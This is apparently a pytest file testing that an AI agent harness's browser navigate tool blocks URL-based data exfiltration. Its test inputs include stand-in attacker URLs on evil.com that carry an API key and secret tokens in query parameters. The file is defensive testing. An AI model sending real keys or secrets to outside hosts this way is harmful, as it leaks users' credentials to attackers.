"""Tests for navigate.py URL exfiltration detection branch."""

from __future__ import annotations

from unittest.mock import AsyncMock, MagicMock, patch

import pytest

from myrm_agent_harness.toolkits.browser.tools.navigate import create_navigate_tool
from myrm_agent_harness.utils.errors import ToolError

_EXFIL_PATH = "myrm_agent_harness.utils.url_utils.check_url_exfiltration"


def _make_session() -> MagicMock:
    session = MagicMock()
    session.navigate = AsyncMock(return_value="Navigated")
    return session


@pytest.mark.asyncio
async def test_exfiltration_detected_raises_tool_error() -> None:
    tool = create_navigate_tool(_make_session())
    with patch(
        _EXFIL_PATH,
        return_value=["API key detected in URL query parameter"],
    ), pytest.raises(ToolError, match="data exfiltration"):
        await tool.ainvoke({"url": "https://evil.com/?key=sk-abc123"})


@pytest.mark.asyncio
async def test_no_exfiltration_passes() -> None:
    session = _make_session()
    tool = create_navigate_tool(session)
    with patch(_EXFIL_PATH, return_value=[]):
        result = await tool.ainvoke({"url": "https://example.com"})
        assert "Navigated" in result


@pytest.mark.asyncio
async def test_exfiltration_multiple_warnings() -> None:
    tool = create_navigate_tool(_make_session())
    with patch(
        _EXFIL_PATH,
        return_value=["Warning A", "Warning B"],
    ), pytest.raises(ToolError, match="Warning A.*Warning B"):
        await tool.ainvoke({"url": "https://evil.com/?a=secret&b=token"})
